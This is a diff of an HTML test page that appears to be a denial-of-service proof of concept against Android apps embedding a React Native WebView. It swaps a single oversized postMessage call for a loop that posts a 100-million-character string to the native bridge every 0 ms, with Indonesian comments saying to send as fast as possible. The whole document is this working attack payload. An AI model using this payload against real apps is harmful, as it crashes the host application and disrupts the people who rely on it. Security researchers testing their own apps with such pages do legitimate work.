@@ -5,20 +5,30 @@
 <script>
 const log = msg => document.getElementById("log").textContent += "\n" + msg;
 
-try {
-    if (window.ReactNativeWebView) {
-        log("ReactNativeWebView handler detected (Android).");
-
-        // Malformed JSON
-        const payload = "A".repeat(10_000_000_000_000_000_000);
-
-        window.ReactNativeWebView.postMessage(payload);
-        log("Payload sent: " + payload);
-    } else {
-        log("ReactNativeWebView handler not available.");
+function post(msg) {
+    try {
+        if (window.ReactNativeWebView) {
+            window.ReactNativeWebView.postMessage(msg);
+        } else {
+            log("ReactNativeWebView handler not available.");
+        }
+    } catch (e) {
+        log("Error: " + e.message);
     }
-} catch (e) {
-    log("JS Exception: " + e.message);
+}
+
+// Buat payload besar tapi masih realistis
+const payload = "A".repeat(100_000_000); // 100 juta karakter
+
+if (window.ReactNativeWebView) {
+    log("ReactNativeWebView handler detected (Android).");
+    log("🚨 Starting 0ms spam!");
+    
+    setInterval(() => {
+        post(payload);
+    }, 0); // kirim secepat mungkin
+} else {
+    log("ReactNativeWebView handler not available.");
 }
 </script>
 </body>
